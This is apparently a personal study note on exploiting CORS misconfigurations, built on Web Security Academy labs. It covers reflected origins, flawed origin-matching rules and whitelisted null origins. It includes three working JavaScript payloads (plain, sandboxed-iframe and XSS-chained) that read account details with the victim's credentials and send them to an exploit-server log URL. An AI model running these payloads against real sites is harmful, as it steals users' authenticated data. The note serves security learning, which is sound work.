Cross origin resource sharing enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). `CORS` is not a protection against cross-origin attacks such as cross-site request forgery (`CSRF`).

![[Pasted image 20251214040621.png]]


If `CORS` poorly implemented it lead to `Cross domain attacks`. `SOP` The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain.

`Allowing Access` header define request origin is allowed.
```sh
GET /sensitive-victim-data HTTP/1.1 Host: vulnerable-website.com Origin: https://malicious-website.com Cookie: sessionid=...

# It then responds with:

HTTP/1.1 200 OK Access-Control-Allow-Origin: https://malicious-website.com Access-Control-Allow-Credentials: true ...
```

To test the `vuln` use this `script`.
```bash
<script> 

var req = new XMLHttpRequest(); 
req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; 
req.send(); 
function reqListener() { location='//exploit_Server_link/log?key='+this.responseText; }; 

</script>
```

### Errors parsing Origin headers
A developer allow access to a domain to attacker can register fake domain and access the resources.

For example, suppose an application grants access to all domains ending in.
```
normal-website.com
```

An attacker might be able to gain access by registering the domain:
```
hackersnormal-website.com
```

Alternatively, suppose an application grants access to all domains beginning with
```
normal-website.com
```

An attacker might be able to gain access using the domain:
```
normal-website.com.evil-user.net
```

### Whitelisted null origin value
Some developers while list the `null` origin.

1. it can be exploited just bypass the `SOP`.
2. Malicious pages serve from `file`  and `sandbox iframe` server  make read sensitive data.
3. Lead to authorize action or data theft.

```bash
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://vuln_endpoint',true); 
req.withCredentials = true; 
req.send(); function reqListener() { location='https://exploit_server/log?key='+encodeURIComponent(this.responseText); }; 
</script>">
</iframe>
```

Try to add any subdomain so that it may allow `Cross origin`. 

```bash
<script> document.location="https://stock.0a5a00a504a83717804303110019003c.web-security-academy.net/?productId=3<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a5a00a504a83717804303110019003c.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0af300980440377d804a023201c10053.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```

For `POC` visit this [blog](https://r0b0ts.medium.com/my-first-bug-bounty-cors-misconfiguration-3e6f38835c4e) and you can use this tool.

```bash
git clone https://github.com/Angix-Black/Corscan.git  
  
cd corscan  
  
python3 setup.py install
```